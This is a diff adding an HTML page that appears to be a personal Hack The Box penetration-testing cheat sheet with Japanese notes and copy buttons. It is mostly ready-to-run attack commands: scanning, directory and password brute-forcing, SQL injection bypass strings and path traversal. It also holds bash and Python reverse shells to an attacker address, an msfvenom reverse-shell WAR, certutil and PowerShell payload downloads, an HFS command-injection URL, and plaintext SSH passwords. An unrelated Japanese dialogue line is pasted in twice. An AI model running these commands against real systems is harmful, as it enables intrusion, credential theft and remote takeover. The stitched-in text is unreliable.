@@ -1,0 +1,280 @@
+<html lang="ja">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex">
+<title>HTB notes</title>
+
+<style type="text/css">
+
+html {
+  scroll-behavior: smooth;
+}
+
+body {
+background-color: #c4ffe1;
+color: #2b2b2b;
+font-size: 100%;
+}
+
+a:link { color: #0000ff; }
+a:visited { color: #0000a0; }
+a:hover { color: #0000ff; }
+a:active { color: #ff8000; }
+
+p {
+text-align: left;
+margin: 0.1em 0px;
+}
+
+#left {
+float:left;
+width:200px;
+position:fixed;
+background-color: #eceaea;
+}
+#right {
+margin-left: 200px;
+}
+
+</style>
+
+</head>
+<body>
+
+<input type="text" id="targetip" value="">
+<input type="text" id="myvpnip" value="">
+<input type="button" value="Exec" onclick="OnButtonClick();"/>
+
+<div id="left">
+<p><a href="">HTB</a></p>
+<p><a href="#id001">nmap</a>
+<p><a href="#id002">nikto</a>,<a href="#id003">wfuzz/dirb</a></p>
+<p><a href="#id004">hydra/CrackMapExec</a>,<a href="#id005">ftp</a></p>
+<p><a href="#id006">searchsploit</a></p>
+<p><a href="#id007">smb</a></p>
+<p><a href="#id008">seclists</a></p>
+<p><a href="#id009">Burp</a></p>
+<p><a href="#id010">find</a></p>
+<p><a href="#id011">11Cフレームに表示します</a></p>
+<p><a href="#id012">12Cフレームに表示します</a></p>
+<p><a href="#cccc">13Cフレームに表示します</a></p>
+
+</div>
+<div id="right">
+<div id="id001a"><u>HTB</u></div>
+openvpn /root/htb.20201030/hack-the-box-vip-mzhashim_20201008.ovpn
+<div id="id001"><u>nmap</u></div>
+<p id="id001001" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001001');"/></br>
+<p id="id001002" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001002');"/></br>
+<p id="id001003" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001003');"/></br>
+<p id="id001004" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001004');"/></br>
+<p id="id001005" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001005');"/></br>
+<p id="id001006" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id001006');"/></br>
+
+<script> 
+function OnButtonClick() {
+var targetip = document.getElementsByTagName("input")[0].value ; 
+var myvpnip = document.getElementsByTagName("input")[2].value ; 
+document.getElementById("id001001").textContent="nmap -T4 -A -O -v "+targetip
+document.getElementById("id001002").textContent="nmap -sV -A -O "+targetip
+document.getElementById("id001003").textContent="nmap -Pn -v -script smb-vuln* -p139,445"+targetip
+document.getElementById("id001004").textContent="ls /usr/share/nmap/scripts/*"
+document.getElementById("id001005").textContent="for x in 17301 28504 9999; do nmap --max-retries 0 -p $x "+targetip+"; done"
+document.getElementById("id001006").textContent="nmap -sP 192.168.246.0/24"
+
+
+document.getElementById("id002001").textContent="nikto -h "+targetip+" -port 8080"
+document.getElementById("id002002").textContent="nkito xxxx"+targetip
+
+
+
+}
+
+function OnButtonClick2(aa) {
+pTag=document.getElementById(aa);
+range = document.createRange();
+range.selectNode(pTag);
+//selection=windows.getSelection();
+getSelection().removeAllRanges();
+getSelection().addRange(range);
+document.execCommand('copy');
+
+}
+
+
+</script>
+
+
+
+<div>
+
+</br>
+
+
+
+
+</div>
+
+
+<div id="id002"><u>nikto</u></div>
+<p id="id002001" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id002001');"/></br>
+<p id="id002002" style="display: inline-block";>ddddd</p><input type="button" value="copy" onclick="OnButtonClick2('id002002');"/></br>
+
+
+
+<div id="id003">wfuzz/dirb</div>
+<div>
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 400,404,403 http://192.168.246.144:8080/FUZZ</br>
+cat /usr/share/wordlists/wfuzz/Injections/Traversal.txt</br>
+ls /usr/share/wordlists/wfuzz</br>
+dirbuster /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.246.144</br>
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.246.144</br>
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .html,.php -u http://192.168.246.148/
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .txt -u http://192.168.246.148/
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -x asp,aspx  -u http://10.129.105.40
+
+
+dirb http://10.129.1.175/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -X .sh
+
+http://192.168.246.129/1.php?file=../../../../../../../etc/passwd
+
+
+dirb http://192.168.246.144:8080</br>
+</br>
+
+</div>
+
+<div id="id004">hydra/CrackMapExec</div>
+<div>
+hydra -L user.txt -P pass.txt 192.168.1.8 ssh</br>
+hydra -L 192.168.246.144_development.user.txt -P 192.168.246.144_development.passwd.txt ssh -t 4</br>
+hydra -l patrick -P ./john/password.lst 192.168.246.146 ssh -t 4</br>
+crackmapexec smb 10.129.178.194 -u heist_user.txt -p heist_password.txt 成功したらそこで終わり/リストに注意</br>
+
+
+</br>
+</div>
+
+<div id="id005">ftp</div>
+<div>
+root@kali:~/20201010/devel# cat ftp.txt</br>
+open 10.129.3.52</br>
+user anonymous</br>
+put devel2.aspx</br>
+bye</br>
+root@kali:~/20201010/devel#
+
+
+root@kali:~/20201010/devel# ftp -v -n < ftp.txt
+</div>
+
+<div id="id006">searchsploit</div>
+<div>
+searchsploit ms17-010</br>
+searchsploit HTTP File Server 2.3</br>
+ls /usr/share/exploitdb/exploits/</br>
+</br>
+</div>
+
+<div id="id007">smb</div>
+<div>
+smbclient //192.168.246.149/helios -U helios baseball</br>
+smbclient --list //10.129.175.91/ -U ""</br>
+smbclient \\\\192.168.246.145\\qiu -U qiu</br>
+enum4linux 
+smbclient //192.168.246.149/anonymous
+ get filename
+smbmap -H 10.129.182.172
+curl -vu "helios:qwerty" "smb://192.168.246.149/helios/"</br>
+</br>
+</div>
+
+<div id="id008">seclists</div>
+<div>
+
+<p id="id008001" style="display: inline-block";>/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt</p><input type="button" value="copy" onclick="OnButtonClick2('id008001');"/></br>
+<p id="id008002" style="display: inline-block";>/usr/share/seclists/Usernames/top-usernames-shortlist.txt</p><input type="button" value="copy" onclick="OnButtonClick2('id008002');"/></br>
+<p id="id008003" style="display: inline-block";>/usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt</p><input type="button" value="copy" onclick="OnButtonClick2('id008003');"/></br>
+<p id="id008004" style="display: inline-block";>/usr/share/seclists/Fuzzing/Databases/sqli.auth.bypass.txt</p><input type="button" value="copy" onclick="OnButtonClick2('id008004');"/></br>
+" or 1=1</br>
+" or 1=1#</br>
+" or 1=1--</br>
+admin" --</br>
+admin" or "1"="1</br>
+<p id="id008005" style="display: inline-block";>/usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt</p><input type="button" value="copy" onclick="OnButtonClick2('id008005');"/></br>
+cgi-bin</br>
+education</br>
+betsie</br>
+accessibility</br>
+
+
+<div id="id009">Burp</div>
+Burp 127.0.0.1:8080</br>
+<img src="brup1.png" alt="" width="450" height="250" border="0"></br>
+seclistsへ</br>
+
+
+
+<div id="id010">find</div>
+
+<p id="id010001" style="display: inline-block";>find / -user xxxx -print 2>/dev/null | grep -v proc</p><input type="button" value="copy" onclick="OnButtonClick2('id010001');"/></br>
+<p id="id010002" style="display: inline-block";>find / -perm 4000 -print 2>/dev/null | grep -v proc</p><input type="button" value="copy" onclick="OnButtonClick2('id010002');"/></br>
+
+
+<div>ビル・ニッセン:ところで、パット、あなたのガールフレンドは、これまでのところニューヨークを気に入っていますか。彼女はロンドンからこちらに着いたばかりですよね。</div>
+
+<div id="id011">(7)</div>
+nc -nlvp 4444</br>
+bash</br>
+
+bash -i >& /dev/tcp/10.10.14.67/4444 0>&1</br>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.67",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</br>
+
+python -c 'import pty; pty.spawn("/bin/bash");'</br>
+python3 -c 'import pty; pty.spawn("/bin/bash")'</br>
+export TERM=screen-256color</br>
+python
+
+echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.67",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'> aa.py</br>
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 -f war > jerryshell.war
+
+
+
+sshpass
+sshpass -p '3edeeee' ssh -o StrictHostKeyChecking=no -p 22 arrexel@10.129.182.12</br>
+sshpass -p 'jEhdIekWmdjE' ssh -o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group1-sha1  -p 22 root@10.129.120.160</br>
+
+cd /root/20210723/Windows-Exploit-Suggester
+./windows-exploit-suggester.py --database 2021-08-01-mssb.xls --systeminfo ../optimum.systeminfo.20210801
+
+
+python -m SimpleHTTPServer 8000
+python3 -m http.server 8000
+
+
+Powershell.exe invoke-webrequest -Uri http://10.10.14.67:8000/41020.exe -OutFile 41020.exe
+(powershellからDOSへの切り替えは、cmd、リバースシェルによっては動かず)
+Invoke-webrequest -Uri http://10.10.14.67:8000/41020.exe -OutFile 41020.exe
+
+certutil -f -split -urlcache http://10.10.14.2/41020.exe ty.exe
+optimum
+http://10.10.10.8/?search=%00{.exec|certutil.exe -urlcache -split -f http://10.10.14.9/nc.exe C:\windows\temp\nc.exe.}
+
+
+<div id="id012">sudo</div>
+sudo -l</br>
+sudo -u username bash -i</br>
+
+
+
+wpscan
+
+
+<div id="cccc">(7)</div>
+<div>ビル・ニッセン:ところで、パット、あなたのガールフレンドは、これまでのところニューヨークを気に入っていますか。彼女はロンドンからこちらに着いたばかりですよね。</div>
+
+</br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br>
+<div>
+</body>
+</html>
